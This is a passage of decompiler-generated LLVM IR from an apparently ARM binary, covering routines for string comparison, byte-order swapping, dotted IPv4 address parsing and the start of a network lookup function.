  uselistorder i32 %v4_f0a4, { 1, 2, 0 }
  uselistorder i32 %v1_f098, { 1, 0, 2 }
  uselistorder i32 %v1_f038, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %v0_f010, { 4, 3, 1, 2, 0 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 4, 0, 1, 5 }
  uselistorder label %dec_label_pc_f0e0, { 1, 0 }
  uselistorder label %dec_label_pc_f0d0, { 1, 0 }
  uselistorder label %.thread16, { 1, 0 }
  uselistorder label %bb28, { 1, 0 }
  uselistorder label %dec_label_pc_f08c, { 1, 0 }
  uselistorder label %bb26, { 1, 0 }
}

define i32 @function_f0f4(i8* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_f0f4:
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* @lr, align 4
  br label %dec_label_pc_f104

dec_label_pc_f104:                                ; preds = %bb8, %dec_label_pc_f0f4
  %v8_f1683 = phi i32 [ %v8_f168, %bb8 ], [ 0, %dec_label_pc_f0f4 ]
  %v0_f15c = phi i32 [ %v1_f15c, %bb8 ], [ %arg2, %dec_label_pc_f0f4 ]
  %v0_f160 = phi i32 [ %v1_f160, %bb8 ], [ %tmp, %dec_label_pc_f0f4 ]
  %v9_f104 = icmp eq i32 %v0_f160, %v0_f15c
  br i1 %v9_f104, label %dec_label_pc_f104._crit_edge, label %dec_label_pc_f10c

dec_label_pc_f104._crit_edge:                     ; preds = %dec_label_pc_f104
  %.pre = inttoptr i32 %v0_f15c to i8*
  br label %bb8

dec_label_pc_f10c:                                ; preds = %dec_label_pc_f104
  %v1_f110 = inttoptr i32 %v0_f160 to i8*
  %v2_f110 = load i8, i8* %v1_f110, align 1
  %v3_f110 = zext i8 %v2_f110 to i32
  %v1_f114 = inttoptr i32 %v0_f15c to i8*
  %v2_f114 = load i8, i8* %v1_f114, align 1
  %v3_f114 = zext i8 %v2_f114 to i32
  %v2_f118 = load i32, i32* bitcast (i32** @global_var_18430.402 to i32*), align 4
  %v2_f11c = mul nuw nsw i32 %v3_f110, 2
  store i32 %v2_f11c, i32* @ip, align 4
  %v2_f120 = mul nuw nsw i32 %v3_f114, 2
  %v2_f124 = add i32 %v2_f120, %v2_f118
  %v2_f128 = add i32 %v2_f118, %v2_f11c
  %v1_f12c = add i32 %v2_f128, 1
  %v2_f12c = inttoptr i32 %v1_f12c to i8*
  %v3_f12c = load i8, i8* %v2_f12c, align 1
  %v4_f12c = zext i8 %v3_f12c to i32
  %v1_f130 = add i32 %v2_f124, 1
  %v2_f130 = inttoptr i32 %v1_f130 to i8*
  %v3_f130 = load i8, i8* %v2_f130, align 1
  %v4_f130 = zext i8 %v3_f130 to i32
  %v3_f134 = inttoptr i32 %v2_f124 to i8*
  %v4_f134 = load i8, i8* %v3_f134, align 1
  %v6_f134 = zext i8 %v4_f134 to i32
  %v3_f138 = inttoptr i32 %v2_f128 to i8*
  %v4_f138 = load i8, i8* %v3_f138, align 1
  %v6_f138 = zext i8 %v4_f138 to i32
  %v3_f13c = mul nuw i32 %v4_f130, 16777216
  %v3_f140 = mul nuw i32 %v4_f12c, 16777216
  %v4_f144 = sdiv i32 %v3_f140, 65536
  %v5_f144 = or i32 %v6_f138, %v4_f144
  %v4_f148 = sdiv i32 %v3_f13c, 65536
  %v5_f148 = or i32 %v4_f148, %v6_f134
  %v2_f14c = sub nsw i32 %v5_f144, %v5_f148
  %v9_f14c = icmp eq i32 %v5_f144, %v5_f148
  br i1 %v9_f14c, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_f10c
  ret i32 %v2_f14c

bb8:                                              ; preds = %dec_label_pc_f104._crit_edge, %dec_label_pc_f10c
  %v1_f154.pre-phi = phi i8* [ %.pre, %dec_label_pc_f104._crit_edge ], [ %v1_f110, %dec_label_pc_f10c ]
  %v8_f168 = phi i32 [ %v8_f1683, %dec_label_pc_f104._crit_edge ], [ %v2_f14c, %dec_label_pc_f10c ]
  %v2_f154 = load i8, i8* %v1_f154.pre-phi, align 1
  %v2_f158 = icmp eq i8 %v2_f154, 0
  %v1_f15c = add i32 %v0_f15c, 1
  %v1_f160 = add i32 %v0_f160, 1
  store i32 %v1_f160, i32* @lr, align 4
  br i1 %v2_f158, label %dec_label_pc_f168, label %dec_label_pc_f104

dec_label_pc_f168:                                ; preds = %bb8
  ret i32 %v8_f168

; uselistorder directives
  uselistorder i32 %v1_f160, { 1, 0 }
  uselistorder i32 %v2_f14c, { 1, 0 }
  uselistorder i32 %v5_f148, { 1, 0 }
  uselistorder i32 %v5_f144, { 1, 0 }
  uselistorder i32 %v2_f11c, { 1, 0 }
  uselistorder i32 %v0_f15c, { 1, 2, 0, 3 }
  uselistorder label %bb8, { 1, 0 }
}

define i32 @function_f170(i32 %arg1) local_unnamed_addr {
dec_label_pc_f170:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_f170 = load i32, i32* @r4, align 4
  store i32 %v3_f170, i32* %stack_var_-12, align 4
  %v6_f170 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  %v0_f178 = call i32 @function_ecc0()
  %v1_f17c = add i32 %v0_f178, 1
  store i32 %v1_f17c, i32* @r4, align 4
  %v1_f184 = call i32 @function_f908(i32 %v1_f17c)
  store i32 61848, i32* @lr, align 4
  %v1_f194 = icmp ne i32 %v1_f184, 0
  call void @__pseudo_cond_branch(i1 %v1_f194, i32 ptrtoint (i32* @global_var_ec10.403 to i32))
  %v2_f19c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_f19c, i32* @r4, align 4
  store i32 %v6_f170, i32* @r5, align 4
  ret i32 %v1_f184
}

define i32 @function_f1a0(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_f1a0:
  store i32 %arg1, i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_1a8ac.405 to i32), i32* @r2, align 4
  %v0_f1a4 = call i32 @function_12630()
  %v0_f1a8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_f1a8, label %bb, label %bb1

bb:                                               ; preds = %dec_label_pc_f1a0
  %v2_f1a8 = load i32, i32* @ip, align 4
  %v5_f1a8 = udiv i32 %v2_f1a8, 131072
  %v6_f1a8 = and i32 %v5_f1a8, %arg1
  store i32 %v6_f1a8, i32* @sl, align 4
  br label %bb1

bb1:                                              ; preds = %dec_label_pc_f1a0, %bb
  ret i32 %v0_f1a4

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_f1ac(i32 %arg1) local_unnamed_addr {
dec_label_pc_f1ac:
  %stack_var_-64 = alloca i32, align 4
  %v2_f1b0 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_f1b0, i32* @r1, align 4
  %v0_f1b8 = call i32 @function_f1cc()
  %v1_f1bc = sub i32 1, %v0_f1b8
  %v2_f1bc = icmp ult i32 %v0_f1b8, 2
  br i1 %v2_f1bc, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_f1ac
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_f1ac, %bb
  %v5_f1c8 = phi i32 [ %v1_f1bc, %dec_label_pc_f1ac ], [ 0, %bb ]
  ret i32 %v5_f1c8

; uselistorder directives
  uselistorder i32 %v0_f1b8, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_f1cc() local_unnamed_addr {
dec_label_pc_f1cc:
  %ip.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = call i8 @__decompiler_undefined_function_2()
  %stack_var_-39 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v3_f1cc = load i32, i32* @r4, align 4
  %v6_f1cc = load i32, i32* @r5, align 4
  %v2_f1d0 = ptrtoint i32* %stack_var_-56 to i32
  %v0_f1d4 = load i32, i32* @r1, align 4
  store i32 %v0_f1d4, i32* %r6.global-to-local, align 4
  %v0_f1e0 = load i32, i32* @r0, align 4
  %v3_f1e0 = call i32 @function_cac8(i32 %v0_f1e0, i32 21505, i32 %v2_f1d0)
  store i32 %v3_f1e0, i32* %r7.global-to-local, align 4
  %v2_f1e4 = icmp eq i32 %v3_f1e0, 0
  %v2_f1ec = ptrtoint i32* %stack_var_-39 to i32
  store i32 %v2_f1ec, i32* @r1, align 4
  %v0_f1f4 = load i32, i32* %r6.global-to-local, align 4
  br i1 %v2_f1e4, label %dec_label_pc_f1fc, label %dec_label_pc_f228

dec_label_pc_f1fc:                                ; preds = %dec_label_pc_f1cc
  %v1_f1f4 = add i32 %v0_f1f4, 17
  %v4_f204 = zext i8 %tmp to i32
  store i32 %v4_f204, i32* @r5, align 4
  %v2_f208 = load i32, i32* %stack_var_-56, align 4
  %v1_f20c = inttoptr i32 %v0_f1f4 to i32*
  store i32 %v2_f208, i32* %v1_f20c, align 4
  %v3_f20c = add i32 %v0_f1f4, 4
  %v4_f20c = inttoptr i32 %v3_f20c to i32*
  %v5_f20c = load i32, i32* %ip.global-to-local, align 4
  store i32 %v5_f20c, i32* %v4_f20c, align 4
  %v6_f20c = add i32 %v0_f1f4, 8
  %v7_f20c = inttoptr i32 %v6_f20c to i32*
  %v8_f20c = load i32, i32* @lr, align 4
  store i32 %v8_f20c, i32* %v7_f20c, align 4
  %v0_f210 = load i32, i32* @r4, align 4
  %v1_f210 = load i32, i32* %r6.global-to-local, align 4
  %v2_f210 = add i32 %v1_f210, 12
  %v3_f210 = inttoptr i32 %v2_f210 to i32*
  store i32 %v0_f210, i32* %v3_f210, align 4
  %v0_f214 = load i32, i32* @r5, align 4
  %v1_f214 = trunc i32 %v0_f214 to i8
  %v2_f214 = load i32, i32* %r6.global-to-local, align 4
  %v3_f214 = add i32 %v2_f214, 16
  %v4_f214 = inttoptr i32 %v3_f214 to i8*
  store i8 %v1_f214, i8* %v4_f214, align 1
  %v4_f218 = call i32 @function_1252c(i32 %v1_f1f4, i32 %v2_f1ec, i32 19, i32 %v2_f208)
  %v0_f21c = load i32, i32* %r7.global-to-local, align 4
  store i32 13, i32* @r2, align 4
  %v2_f224 = inttoptr i32 %v4_f218 to i8*
  %v3_f224 = call i32 @function_ec20(i8* %v2_f224, i32 %v0_f21c)
  br label %dec_label_pc_f228

dec_label_pc_f228:                                ; preds = %dec_label_pc_f1cc, %dec_label_pc_f1fc
  %v0_f228 = phi i32 [ %v3_f1e0, %dec_label_pc_f1cc ], [ %v0_f21c, %dec_label_pc_f1fc ]
  store i32 %v3_f1cc, i32* @r4, align 4
  store i32 %v6_f1cc, i32* @r5, align 4
  ret i32 %v0_f228

; uselistorder directives
  uselistorder i32 %v0_f1f4, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_f228, { 1, 0 }
}

define i32 @function_f238(i32 %arg1) local_unnamed_addr {
dec_label_pc_f238:
  %v2_f254 = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_f254
}

define i32 @function_f25c(i32 %arg1) local_unnamed_addr {
dec_label_pc_f25c:
  %tmp = mul i32 %arg1, 256
  %v1_f264 = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_f268 = urem i32 %tmp1, 256
  %v5_f268 = or i32 %v4_f268, %v1_f264
  ret i32 %v5_f268

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_f270(i32 %arg1) local_unnamed_addr {
dec_label_pc_f270:
  %v2_f28c = call i32 @llvm.bswap.i32(i32 %arg1)
  ret i32 %v2_f28c
}

define i32 @function_f294(i32 %arg1) local_unnamed_addr {
dec_label_pc_f294:
  %tmp = mul i32 %arg1, 256
  %v1_f29c = and i32 %tmp, 65280
  %tmp1 = udiv i32 %arg1, 256
  %v4_f2a0 = urem i32 %tmp1, 256
  %v5_f2a0 = or i32 %v4_f2a0, %v1_f29c
  ret i32 %v5_f2a0

; uselistorder directives
  uselistorder i32 65280, { 3, 4, 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @function_f2a8(i32 %arg1) local_unnamed_addr {
dec_label_pc_f2a8:
  %v0_f2b4.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_f2b4

dec_label_pc_f2b4:                                ; preds = %dec_label_pc_f3a0, %dec_label_pc_f2a8
  %v1_f384 = phi i32 [ %v2_f38c, %dec_label_pc_f3a0 ], [ 0, %dec_label_pc_f2a8 ]
  %v0_f394 = phi i32 [ %v1_f394, %dec_label_pc_f3a0 ], [ 0, %dec_label_pc_f2a8 ]
  %v0_f2c8 = phi i32 [ %v1_f3a0, %dec_label_pc_f3a0 ], [ %v0_f2b4.pre, %dec_label_pc_f2a8 ]
  %v1_f2b4 = inttoptr i32 %v0_f2c8 to i8*
  %v2_f2b4 = load i8, i8* %v1_f2b4, align 1
  %v7_f2b8 = icmp eq i8 %v2_f2b4, 48
  br i1 %v7_f2b8, label %dec_label_pc_f2c8, label %.thread

.thread:                                          ; preds = %dec_label_pc_f2b4
  br label %.thread9

dec_label_pc_f2c8:                                ; preds = %dec_label_pc_f2b4
  %v1_f2c8 = add i32 %v0_f2c8, 1
  %v2_f2c8 = inttoptr i32 %v1_f2c8 to i8*
  %v3_f2c8 = load i8, i8* %v2_f2c8, align 1
  %v7_f2cc = icmp eq i8 %v3_f2c8, 88
  br i1 %v7_f2cc, label %bb58, label %bb

bb:                                               ; preds = %dec_label_pc_f2c8
  %v8_f2d0 = icmp eq i8 %v3_f2c8, 120
  br i1 %v8_f2d0, label %bb58, label %.thread3

.thread3:                                         ; preds = %bb
  br label %.thread9

bb58:                                             ; preds = %dec_label_pc_f2c8, %bb
  %v2_f2dc = add i32 %v0_f2c8, 2
  br label %.thread9

.thread9:                                         ; preds = %.thread3, %.thread, %bb58
  %v0_f36823 = phi i32 [ %v1_f2c8, %.thread3 ], [ %v0_f2c8, %.thread ], [ %v2_f2dc, %bb58 ]
  %v0_f37842 = phi i32 [ 1, %.thread3 ], [ 0, %.thread ], [ 0, %bb58 ]
  %v0_f32c37 = phi i32 [ 8, %.thread3 ], [ 10, %.thread ], [ 16, %bb58 ]
  br label %dec_label_pc_f368

dec_label_pc_f2f0:                                ; preds = %dec_label_pc_f368
  %v2_f370 = mul nuw nsw i32 %v3_f368, 2
  %v2_f2f4 = load i32, i32* @global_var_18428, align 4
  %v2_f2f8 = add i32 %v2_f2f4, %v2_f370
  %v3_f2fc = inttoptr i32 %v2_f2f8 to i8*
  %v4_f2fc = load i8, i8* %v3_f2fc, align 1
  %v6_f2fc = zext i8 %v4_f2fc to i32
  %v1_f308 = and i32 %v6_f2fc, 8
  %v2_f308 = icmp eq i32 %v1_f308, 0
  br i1 %v2_f308, label %dec_label_pc_f338, label %dec_label_pc_f310

dec_label_pc_f310:                                ; preds = %dec_label_pc_f2f0
  %tmp = icmp ult i8 %v2_f368, 56
  br i1 %tmp, label %.thread11, label %bb61

.thread11:                                        ; preds = %dec_label_pc_f310
  br label %dec_label_pc_f32c

bb61:                                             ; preds = %dec_label_pc_f310
  %v7_f310 = icmp eq i32 %v0_f338, 8
  %v2_f324 = icmp eq i1 %v7_f310, false
  br i1 %v2_f324, label %dec_label_pc_f32c, label %dec_label_pc_f3b0

dec_label_pc_f32c:                                ; preds = %.thread11, %bb61
  %v3_f32c = mul i32 %v1_f38c, %v0_f32c37
  %v4_f32c = add i32 %v3_f368, %v3_f32c
  %v1_f330 = add i32 %v4_f32c, -48
  br label %dec_label_pc_f358

dec_label_pc_f338:                                ; preds = %dec_label_pc_f2f0
  %v7_f338 = icmp eq i32 %v0_f338, 16
  br i1 %v7_f338, label %dec_label_pc_f340, label %dec_label_pc_f378

dec_label_pc_f340:                                ; preds = %dec_label_pc_f338
  %v1_f340 = and i32 %v6_f2fc, 16
  %v2_f340 = icmp eq i32 %v1_f340, 0
  br i1 %v2_f340, label %dec_label_pc_f378, label %dec_label_pc_f348

dec_label_pc_f348:                                ; preds = %dec_label_pc_f340
  %v1_f348 = and i32 %v6_f2fc, 2
  %tmp80 = mul nuw nsw i32 %v1_f348, 16
  %tmp81 = xor i32 %tmp80, 32
  %tmp82 = add nsw i32 %tmp81, -87
  %v4_f354 = mul i32 %v1_f38c, 16
  %v5_f354 = add i32 %tmp82, %v4_f354
  br label %dec_label_pc_f358

dec_label_pc_f358:                                ; preds = %dec_label_pc_f32c, %dec_label_pc_f348
  %v0_f33831 = phi i32 [ %v0_f32c37, %dec_label_pc_f32c ], [ 16, %dec_label_pc_f348 ]
  %storemerge = phi i32 [ %v1_f330, %dec_label_pc_f32c ], [ %v5_f354, %dec_label_pc_f348 ]
  %v1_f35c = add i32 %v0_f3a0, 1
  %tmp83 = icmp ugt i32 %storemerge, 255
  br i1 %tmp83, label %dec_label_pc_f3b0, label %dec_label_pc_f368

dec_label_pc_f368:                                ; preds = %dec_label_pc_f358, %.thread9
  %v0_f378 = phi i32 [ 1, %dec_label_pc_f358 ], [ %v0_f37842, %.thread9 ]
  %v1_f38c = phi i32 [ %storemerge, %dec_label_pc_f358 ], [ 0, %.thread9 ]
  %v0_f338 = phi i32 [ %v0_f33831, %dec_label_pc_f358 ], [ %v0_f32c37, %.thread9 ]
  %v0_f3a0 = phi i32 [ %v1_f35c, %dec_label_pc_f358 ], [ %v0_f36823, %.thread9 ]
  %v1_f368 = inttoptr i32 %v0_f3a0 to i8*
  %v2_f368 = load i8, i8* %v1_f368, align 1
  %v3_f368 = zext i8 %v2_f368 to i32
  %v2_f36c = icmp eq i8 %v2_f368, 0
  br i1 %v2_f36c, label %dec_label_pc_f378, label %dec_label_pc_f2f0

dec_label_pc_f378:                                ; preds = %dec_label_pc_f338, %dec_label_pc_f368, %dec_label_pc_f340
  %v2_f368.lcssa = phi i8 [ %v2_f368, %dec_label_pc_f338 ], [ 0, %dec_label_pc_f368 ], [ %v2_f368, %dec_label_pc_f340 ]
  %v2_f36c.lcssa = phi i1 [ false, %dec_label_pc_f338 ], [ true, %dec_label_pc_f368 ], [ false, %dec_label_pc_f340 ]
  %v2_f378 = icmp eq i32 %v0_f378, 0
  br i1 %v2_f378, label %dec_label_pc_f3b0, label %dec_label_pc_f380

dec_label_pc_f380:                                ; preds = %dec_label_pc_f378
  %v2_f380 = icmp eq i32 %v0_f394, 0
  br i1 %v2_f380, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_f380
  %v4_f384 = mul i32 %v1_f384, 256
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_f380, %bb64
  %v0_f38c = phi i32 [ %v1_f384, %dec_label_pc_f380 ], [ %v4_f384, %bb64 ]
  %v7_f388 = icmp eq i8 %v2_f368.lcssa, 46
  %v2_f38c = or i32 %v0_f38c, %v1_f38c
  br i1 %v7_f388, label %dec_label_pc_f394, label %dec_label_pc_f3a8

dec_label_pc_f394:                                ; preds = %bb65
  %v1_f394 = add i32 %v0_f394, 1
  %v7_f398 = icmp eq i32 %v1_f394, 4
  br i1 %v7_f398, label %dec_label_pc_f3b0, label %dec_label_pc_f3a0

dec_label_pc_f3a0:                                ; preds = %dec_label_pc_f394
  %v1_f3a0 = add i32 %v0_f3a0, 1
  br label %dec_label_pc_f2b4

dec_label_pc_f3a8:                                ; preds = %bb65
  br i1 %v2_f36c.lcssa, label %dec_label_pc_f3b4, label %dec_label_pc_f3b0

dec_label_pc_f3b0:                                ; preds = %dec_label_pc_f394, %dec_label_pc_f378, %bb61, %dec_label_pc_f358, %dec_label_pc_f3a8
  br label %dec_label_pc_f3b4

dec_label_pc_f3b4:                                ; preds = %dec_label_pc_f3a8, %dec_label_pc_f3b0
  %v0_f3b4 = phi i32 [ %v2_f38c, %dec_label_pc_f3a8 ], [ -1, %dec_label_pc_f3b0 ]
  ret i32 %v0_f3b4

; uselistorder directives
  uselistorder i32 %v1_f394, { 1, 0 }
  uselistorder i8 %v2_f368, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_f3a0, { 0, 2, 1 }
  uselistorder i32 %v0_f338, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v0_f32c37, { 1, 2, 0 }
  uselistorder i32 %v1_f384, { 1, 0 }
  uselistorder label %dec_label_pc_f3b4, { 1, 0 }
  uselistorder label %dec_label_pc_f3b0, { 4, 0, 1, 3, 2 }
  uselistorder label %bb65, { 1, 0 }
  uselistorder label %dec_label_pc_f378, { 1, 2, 0 }
  uselistorder label %dec_label_pc_f358, { 1, 0 }
  uselistorder label %dec_label_pc_f32c, { 1, 0 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %bb58, { 1, 0 }
}

define i32 @function_f3c0(i32 %arg1) local_unnamed_addr {
dec_label_pc_f3c0:
  %stack_var_-8 = alloca i32, align 4
  %v2_f3c4 = ptrtoint i32* %stack_var_-8 to i32
  %v0_f3cc = load i32, i32* @r0, align 4
  %v2_f3cc = inttoptr i32 %v0_f3cc to i8*
  %v3_f3cc = call i32 @function_126e4(i8* %v2_f3cc, i32 %v2_f3c4)
  %v2_f3d0 = icmp eq i32 %v3_f3cc, 0
  br i1 %v2_f3d0, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_f3c0
  %v3_f3d8 = load i32, i32* %stack_var_-8, align 4
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_f3c0, %bb
  %v5_f3e0 = phi i32 [ -1, %dec_label_pc_f3c0 ], [ %v3_f3d8, %bb ]
  ret i32 %v5_f3e0

; uselistorder directives
  uselistorder label %bb4, { 1, 0 }
}

define i32 @function_f3e4(i32 %arg1) local_unnamed_addr {
dec_label_pc_f3e4:
  %stack_var_-12 = alloca i32, align 4
  %v3_f3e4 = load i32, i32* @r4, align 4
  store i32 %arg1, i32* @r4, align 4
  %v0_f3f0 = call i32 @function_11004()
  %v2_f3f4 = ptrtoint i32* %stack_var_-12 to i32
  %v0_f400 = load i32, i32* @r4, align 4
  %v7_f410 = call i32 @function_f428(i32 %v0_f400, i32* nonnull @global_var_1aa7c.409, i32 ptrtoint (i32* @global_var_1a8b0.411 to i32), i32 460, i32 %v2_f3f4, i32 %v0_f3f0)
  %v3_f414 = load i32, i32* %stack_var_-12, align 4
  store i32 %v3_f3e4, i32* @r4, align 4
  ret i32 %v3_f414
}

define i32 @function_f428(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
dec_label_pc_f428:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %stack_var_0 = alloca i32, align 4
  store i32 %arg5, i32* %stack_var_0, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_f428 = load i32, i32* @r5, align 4
  %v9_f428 = load i32, i32* @r6, align 4
  %v12_f428 = load i32, i32* @r7, align 4
  %v15_f428 = load i32, i32* @r8, align 4
  %v18_f428 = load i32, i32* @sb, align 4
  %v21_f428 = load i32, i32* @sl, align 4
  %v24_f428 = load i32, i32* @fp, align 4
  store i32 %arg3, i32* @r7, align 4
  store i32 %arg5, i32* %r2.global-to-local, align 4
  %v0_f438 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_f438, i32* @fp, align 4
  %v2_f438 = icmp eq i32 %v0_f438, 0
  store i32 0, i32* @r6, align 4
  store i32 %tmp, i32* @sl, align 4
  store i32 %arg4, i32* @r4, align 4
  %v2_f448 = inttoptr i32 %arg5 to i32*
  store i32 0, i32* %v2_f448, align 4
  br i1 %v2_f438, label %bb, label %dec_label_pc_f454

bb:                                               ; preds = %dec_label_pc_f428
  %v1_f44c = load i32, i32* %r0.global-to-local, align 4
  %v2_f44c = add i32 %v1_f44c, 22
  store i32 %v2_f44c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f778

dec_label_pc_f454:                                ; preds = %dec_label_pc_f428
  %v0_f454 = call i32 @function_cc08()
  store i32 %v0_f454, i32* %r0.global-to-local, align 4
  %v3_f458 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_f458, i32* %ip.global-to-local, align 4
  %v1_f45c = inttoptr i32 %v0_f454 to i32*
  %v2_f45c = load i32, i32* %v1_f45c, align 4
  store i32 %v2_f45c, i32* @r8, align 4
  %v0_f460 = load i32, i32* @r6, align 4
  store i32 %v0_f460, i32* %v1_f45c, align 4
  %v0_f464 = load i32, i32* %ip.global-to-local, align 4
  store i32 %arg6, i32* %ip.global-to-local, align 4
  store i32 %v0_f454, i32* @r5, align 4
  %v0_f474 = load i32, i32* @fp, align 4
  store i32 %v0_f474, i32* %r0.global-to-local, align 4
  %v0_f478 = load i32, i32* @sl, align 4
  store i32 %v0_f478, i32* %r2.global-to-local, align 4
  %v0_f47c = load i32, i32* @r7, align 4
  store i32 %v0_f47c, i32* %r3.global-to-local, align 4
  %v0_f480 = load i32, i32* @r4, align 4
  %v7_f488 = call i32 @function_132b0(i32 %v0_f474, i32 2, i32 %v0_f478, i32 %v0_f47c, i32 %v0_f480, i32 %v0_f464, i32 %arg6)
  store i32 %v7_f488, i32* %r0.global-to-local, align 4
  %v2_f48c = icmp eq i32 %v7_f488, 0
  br i1 %v2_f48c, label %dec_label_pc_f778, label %dec_label_pc_f494

dec_label_pc_f494:                                ; preds = %dec_label_pc_f454
  store i32 %arg6, i32* %r2.global-to-local, align 4
  %v1_f498 = inttoptr i32 %arg6 to i32*
  %v2_f498 = load i32, i32* %v1_f498, align 4
  store i32 %v2_f498, i32* %r3.global-to-local, align 4
  %v7_f49c = icmp eq i32 %v2_f498, 1
  br i1 %v7_f49c, label %dec_label_pc_f4c0, label %dec_label_pc_f4a4

dec_label_pc_f4a4:                                ; preds = %dec_label_pc_f494
  %v7_f4a4 = icmp eq i32 %v2_f498, 4
  br i1 %v7_f4a4, label %dec_label_pc_f4c0, label %dec_label_pc_f4ac

dec_label_pc_f4ac:                                ; preds = %dec_label_pc_f4a4
  %v3_f4ac = icmp eq i32 %v2_f498, -1
  br i1 %v3_f4ac, label %dec_label_pc_f4b4, label %dec_label_pc_f778

dec_label_pc_f4b4:                                ; preds = %dec_label_pc_f4ac
  %v0_f4b4 = load i32, i32* @r5, align 4
  %v1_f4b4 = inttoptr i32 %v0_f4b4 to i32*
  %v2_f4b4 = load i32, i32* %v1_f4b4, align 4
  store i32 %v2_f4b4, i32* %r3.global-to-local, align 4
  %v7_f4b8 = icmp eq i32 %v2_f4b4, 2
  br i1 %v7_f4b8, label %dec_label_pc_f4c0, label %dec_label_pc_f778

dec_label_pc_f4c0:                                ; preds = %dec_label_pc_f4b4, %dec_label_pc_f4a4, %dec_label_pc_f494
  %v0_f4c0 = load i32, i32* @r7, align 4
  %v1_f4c0 = sub i32 0, %v0_f4c0
  %v1_f4c4 = urem i32 %v1_f4c0, 4
  store i32 %v1_f4c4, i32* %r3.global-to-local, align 4
  %v2_f4c4 = icmp eq i32 %v1_f4c4, 0
  %v0_f4c8 = load i32, i32* @r8, align 4
  %v1_f4c8 = load i32, i32* @r5, align 4
  %v2_f4c8 = inttoptr i32 %v1_f4c8 to i32*
  store i32 %v0_f4c8, i32* %v2_f4c8, align 4
  %v0_f4e8.pre = load i32, i32* @r4, align 4
  br i1 %v2_f4c4, label %dec_label_pc_f4e0, label %dec_label_pc_f4d0

dec_label_pc_f4d0:                                ; preds = %dec_label_pc_f4c0
  %v1_f4d0 = load i32, i32* %r3.global-to-local, align 4
  %v2_f4d0 = sub i32 %v0_f4e8.pre, %v1_f4d0
  %v3_f4d0 = icmp ult i32 %v0_f4e8.pre, %v1_f4d0
  br i1 %v3_f4d0, label %dec_label_pc_f774, label %dec_label_pc_f4d8

dec_label_pc_f4d8:                                ; preds = %dec_label_pc_f4d0
  store i32 %v2_f4d0, i32* @r4, align 4
  %v0_f4dc = load i32, i32* @r7, align 4
  %v2_f4dc = add i32 %v0_f4dc, %v1_f4d0
  store i32 %v2_f4dc, i32* @r7, align 4
  br label %dec_label_pc_f4e0

dec_label_pc_f4e0:                                ; preds = %dec_label_pc_f4c0, %dec_label_pc_f4d8
  %v0_f4e8 = phi i32 [ %v2_f4d0, %dec_label_pc_f4d8 ], [ %v0_f4e8.pre, %dec_label_pc_f4c0 ]
  store i32 %arg6, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %ip.global-to-local, align 4
  store i32 -1, i32* %v1_f498, align 4
  %tmp31 = icmp ult i32 %v0_f4e8, 4
  br i1 %tmp31, label %dec_label_pc_f774, label %dec_label_pc_f4f4

dec_label_pc_f4f4:                                ; preds = %dec_label_pc_f4e0
  %v0_f4f4 = load i32, i32* @r4, align 4
  %v1_f4f4 = add i32 %v0_f4f4, -4
  store i32 %v1_f4f4, i32* %r3.global-to-local, align 4
  %tmp32 = icmp ult i32 %v1_f4f4, 8
  br i1 %tmp32, label %dec_label_pc_f774, label %dec_label_pc_f500

dec_label_pc_f500:                                ; preds = %dec_label_pc_f4f4
  %v1_f500 = add i32 %v0_f4f4, -12
  store i32 %v1_f500, i32* %r3.global-to-local, align 4
  %v0_f504 = load i32, i32* @r7, align 4
  %v1_f504 = add i32 %v0_f504, 4
  store i32 %v1_f504, i32* @sb, align 4
  store i32 0, i32* @r5, align 4
  %v3_f510 = inttoptr i32 %v1_f504 to i32*
  store i32 %v0_f504, i32* %v3_f510, align 4
  %v0_f514 = load i32, i32* @r5, align 4
  %v1_f514 = load i32, i32* @sb, align 4
